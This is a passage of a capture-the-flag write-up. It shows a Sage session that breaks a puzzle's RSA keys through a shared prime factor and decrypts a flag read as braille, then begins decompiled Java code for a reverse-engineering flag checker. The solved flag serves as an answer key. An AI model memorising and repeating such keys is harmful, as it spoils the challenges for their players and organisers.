</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sage: n_arr <span style="color:#555">=</span> [<span style="color:#f60">101624963561615795807663999026679788748815571421569462807927860956728888493496000977417890670717889501659207162509309001973634584813285</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">342662515006961794389212761798054369199413737251594682052270204212522489108642197112766627721236631574948182620021172433826492285874433680636116</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">813877578486396232272605937561</span>, <span style="color:#f60">1011616617510531186379147101997466731485620478711403355091755786287415666522860447862499110392145759510656666591</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">470242416519048039892002751007637404549414518731218298102241824341344268742743948423404434709057414369822440704279068689361239474954277506897937</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">87251736335878699753312245001791230360774169153125961</span>, <span style="color:#f60">95526787053419014109054725109743370408304260719719585954706005684413321609913217550727024</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">245842583031598086600304887433115914852617240935445485427407699442096748854890978725921696692177567320558635896629488221767729803968358687622408</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">630160337012535746823742288778463891730458119068421721485754533986448559521</span>, <span style="color:#f60">1392298901743569283830885491292450369489388067227114648628412229866</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">087851506138834981673061940930326777192231195720059963067126884964384173164941643023918419515241929067350793936588931936577031156295691633910531</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">29315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201</span>, <span style="color:#f60">22757826149764684743463933021927715182500340</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">484111227818579368360240839107126711849522664234633613754664100700942438561118214061073557590806391491871814598185848108761608510852179612557240</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">139333852547118051755659499478661739234908902510957853009340542872322052976036210119239981021264970596897721054414227247</span>]
</span></span><span style="display:flex;"><span>sage: <span style="color:#069;font-weight:bold">for</span> a <span style="color:#000;font-weight:bold">in</span> n_arr:
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>:     <span style="color:#069;font-weight:bold">for</span> b <span style="color:#000;font-weight:bold">in</span> n_arr:
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>:         <span style="color:#069;font-weight:bold">if</span> a <span style="color:#555">!=</span> b <span style="color:#000;font-weight:bold">and</span> gcd(a,b) <span style="color:#555">&gt;</span> <span style="color:#f60">1</span>:
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>:             <span style="color:#366">print</span>(a, b, gcd(a, b))
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>:             <span style="color:#069;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>:
</span></span><span style="display:flex;"><span><span style="color:#f60">101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961</span> <span style="color:#f60">139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201</span> <span style="color:#f60">11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379</span>
</span></span><span style="display:flex;"><span><span style="color:#f60">139229890174356928383088549129245036948938806722711464862841222986608785150613883498167306194093032677719223119572005996306712688496438417316494164302391841951524192906735079393658893193657703115629569163391053129315864720324029971949625294486467313990931665248372153504002783908891387654449725452212287159201</span> <span style="color:#f60">101161661751053118637914710199746673148562047871140335509175578628741566652286044786249911039214575951065666659147024241651904803989200275100763740454941451873121829810224182434134426874274394842340443470905741436982244070427906868936123947495427750689793787251736335878699753312245001791230360774169153125961</span> <span style="color:#f60">11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506938573782182379</span>
</span></span><span style="display:flex;"><span>sage: <span style="color:#069;font-weight:bold">import</span> <span style="color:#0cf;font-weight:bold">base64</span>
</span></span><span style="display:flex;"><span>sage: c <span style="color:#555">=</span> base64<span style="color:#555">.</span>b64decode(<span style="color:#c30">&#39;Z9jO5jqN9+fKNYJ14xA3QV96x4AlIIjOwoGSSq2D0G6ddMnKipNJkS2n0IS3blQAMym5dnzKC5MIetKikgozmzruuKDn2Xbkdv529Na2MXizJEMTxP/ioYzUFl</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">2</span>rJfg7xvyrNxEyPRWoJievmjpnum2pkrWAknAb<span style="color:#555">+</span><span style="color:#f60">6</span>Hj0Qv5yIo<span style="color:#555">=</span><span style="color:#c30">&#39;)</span>
</span></span><span style="display:flex;"><span>sage: <span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>sage: c <span style="color:#555">=</span> bytes_to_long(c)
</span></span><span style="display:flex;"><span>sage: e <span style="color:#555">=</span> <span style="color:#f60">65537</span>
</span></span><span style="display:flex;"><span>sage: n <span style="color:#555">=</span> <span style="color:#f60">10116166175105311863791471019974667314856204787114033550917557862874156665228604478624991103921457595106566665914702424165190480398920027510</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">076374045494145187312182981022418243413442687427439484234044347090574143698224407042790686893612394749542775068979378725173633587869975331224500</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">1791230360774169153125961</span>
</span></span><span style="display:flex;"><span>sage: q <span style="color:#555">=</span> <span style="color:#f60">11404558015123108856751187513905109381282387160753409607670595499554019241036182740264653756082739068977207604410155939806146572246665811506</span>
</span></span><span style="display:flex;"><span><span style="color:#555">....</span>: <span style="color:#f60">938573782182379</span>
</span></span><span style="display:flex;"><span>sage: p <span style="color:#555">=</span> n<span style="color:#555">//</span>q
</span></span><span style="display:flex;"><span>sage: d <span style="color:#555">=</span> inverse_mod(e, (p<span style="color:#555">-</span><span style="color:#f60">1</span>)<span style="color:#555">*</span>(q<span style="color:#555">-</span><span style="color:#f60">1</span>))
</span></span><span style="display:flex;"><span>sage: long_to_bytes(<span style="color:#366">int</span>(<span style="color:#366">pow</span>(c,d,n)))
</span></span><span style="display:flex;"><span><span style="color:#c30">b</span><span style="color:#c30">&#39;p_ctf</span><span style="color:#a00">{010100_100000101100_100110100000111010100010100110100010111001010100111000}</span><span style="color:#c30">&#39;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because the challenge name is Blind, I assume that the binary is braille. We will get the correct flag after decrypting the binary with braille</p>
<blockquote>
<p>Flag: p_ctf{I_AM_DAREDEVIL}</p>
</blockquote>
<h2 id="rev">Rev <a href="#rev" class="anchor">#</a></h2>
<h3 id="oak">Oak <a href="#oak" class="anchor">#</a></h3>
<p>We were given a file <code>Oak.class</code>. We can decompile it and it will give us this result</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Decompiled by Procyon v0.5.36
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">//
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">class</span> <span style="color:#0a8;font-weight:bold">Oak</span>
</span></span><span style="display:flex;"><span><span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[]</span> data<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">t_helper</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">int</span> n<span style="color:#555">,</span> <span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> array<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>array<span style="color:#555">[</span>n<span style="color:#555">]</span> <span style="color:#555">!=</span> <span style="color:#555">-</span>1<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">[</span>n<span style="color:#555">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>n <span style="color:#555">==</span> 0<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">[</span>0<span style="color:#555">]</span> <span style="color:#555">=</span> 0<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>n <span style="color:#555">==</span> 1<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">[</span>1<span style="color:#555">]</span> <span style="color:#555">=</span> 1<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>n <span style="color:#555">==</span> 2<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">[</span>2<span style="color:#555">]</span> <span style="color:#555">=</span> 3<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">[</span>n<span style="color:#555">]</span> <span style="color:#555">=</span> 3 <span style="color:#555">*</span> t_helper<span style="color:#555">(</span>n <span style="color:#555">-</span> 1<span style="color:#555">,</span> array<span style="color:#555">)</span> <span style="color:#555">-</span> 3 <span style="color:#555">*</span> t_helper<span style="color:#555">(</span>n <span style="color:#555">-</span> 2<span style="color:#555">,</span> array<span style="color:#555">)</span> <span style="color:#555">+</span> t_helper<span style="color:#555">(</span>n <span style="color:#555">-</span> 3<span style="color:#555">,</span> array<span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">t</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">int</span> n<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[]</span> array <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#078;font-weight:bold">int</span><span style="color:#555">[</span>n <span style="color:#555">+</span> 1<span style="color:#555">];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> <span style="color:#555">(</span><span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> 0<span style="color:#555">;</span> i <span style="color:#555">&lt;</span> array<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">;</span> <span style="color:#555">++</span>i<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            array<span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">=</span> <span style="color:#555">-</span>1<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> t_helper<span style="color:#555">(</span>n<span style="color:#555">,</span> array<span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">main</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">final</span> String<span style="color:#555">[]</span> array<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>array<span style="color:#555">.</span><span style="color:#309">length</span> <span style="color:#555">!=</span> 1<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#555">.</span><span style="color:#309">out</span><span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span><span style="color:#c30">&#34;Usage: [flag]&#34;</span><span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">return</span><span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>check<span style="color:#555">(</span>array<span style="color:#555">[</span>0<span style="color:#555">]))</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#555">.</span><span style="color:#309">out</span><span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span><span style="color:#c30">&#34;Correct!&#34;</span><span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">else</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#555">.</span><span style="color:#309">out</span><span style="color:#555">.</span><span style="color:#309">println</span><span style="color:#555">(</span><span style="color:#c30">&#34;Incorrect&#34;</span><span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[]</span> <span style="color:#c0f">conv</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">final</span> String s<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[]</span> array <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[</span>s<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">()];</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> <span style="color:#555">(</span><span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> 0<span style="color:#555">;</span> i <span style="color:#555">&lt;</span> s<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">();</span> <span style="color:#555">++</span>i<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            array<span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">=</span> <span style="color:#555">(</span>s<span style="color:#555">.</span><span style="color:#309">charAt</span><span style="color:#555">(</span>i<span style="color:#555">)</span> <span style="color:#555">&lt;&lt;</span> 8<span style="color:#555">)</span> <span style="color:#555">+</span> s<span style="color:#555">.</span><span style="color:#309">charAt</span><span style="color:#555">((</span>i <span style="color:#555">+</span> 1<span style="color:#555">)</span> <span style="color:#555">%</span> s<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">());</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> array<span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">public</span> <span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">boolean</span> <span style="color:#c0f">check</span><span style="color:#555">(</span><span style="color:#069;font-weight:bold">final</span> String s<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">final</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[]</span> conv <span style="color:#555">=</span> conv<span style="color:#555">(</span>s<span style="color:#555">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">for</span> <span style="color:#555">(</span><span style="color:#078;font-weight:bold">int</span> i <span style="color:#555">=</span> 0<span style="color:#555">;</span> i <span style="color:#555">&lt;</span> conv<span style="color:#555">.</span><span style="color:#309">length</span><span style="color:#555">;</span> <span style="color:#555">++</span>i<span style="color:#555">)</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#069;font-weight:bold">if</span> <span style="color:#555">(</span>Oak<span style="color:#555">.</span><span style="color:#309">data</span><span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">!=</span> <span style="color:#555">(</span>conv<span style="color:#555">[</span>i<span style="color:#555">]</span> <span style="color:#555">^</span> <span style="color:#555">(</span><span style="color:#078;font-weight:bold">long</span><span style="color:#555">)</span>t<span style="color:#555">(</span>i <span style="color:#555">*</span> i<span style="color:#555">)))</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#069;font-weight:bold">return</span> <span style="color:#069;font-weight:bold">false</span><span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">return</span> <span style="color:#069;font-weight:bold">true</span><span style="color:#555">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#555">}</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">static</span> <span style="color:#555">{</span>
</span></span><span style="display:flex;"><span>        Oak<span style="color:#555">.</span><span style="color:#309">data</span> <span style="color:#555">=</span> <span style="color:#069;font-weight:bold">new</span> <span style="color:#078;font-weight:bold">long</span><span style="color:#555">[]</span> <span style="color:#555">{</span> 28767L<span style="color:#555">,</span> 24418L<span style="color:#555">,</span> 25470L<span style="color:#555">,</span> 29771L<span style="color:#555">,</span> 26355L<span style="color:#555">,</span> 31349L<span style="color:#555">,</span> 13032L<span style="color:#555">,</span> 30456L<span style="color:#555">,</span> 14663L<span style="color:#555">,</span> 27592L<span style="color:#555">,</span> 8916L<span style="color:#555">,</span> 29409L<span style="color:#555">,</span> 7348L<span style="color:#555">,</span> 17474L<span style="color:#555">,</span> 5124L<span style="color:#555">,</span> 3345L<span style="color:#555">,</span> 49357L<span style="color:#555">,</span> 61058L<span style="color:#555">,</span> 65159L<span style="color:#555">,</span> 53773L<span style="color:#555">,</span> 67886L<span style="color:#555">,</span> 72426L<span style="color:#555">,</span> 103728L<span style="color:#555">,</span> 158125L<span style="color:#555">,</span> 179542L<span style="color:#555">,</span> 166504L<span style="color:#555">,</span> 212101L<span style="color:#555">,</span> 282674L<span style="color:#555">,</span> 320873L<span style="color:#555">,</span> 329272L<span style="color:#555">,</span> 400021L<span style="color:#555">,</span> 479881L<span style="color:#555">,</span> 535081L<span style="color:#555">,</span> 599886L<span style="color:#555">,</span> 662294L<span style="color:#555">,</span> 731441L<span style="color:#555">,</span> 831284L<span style="color:#555">,</span> 947032L<span 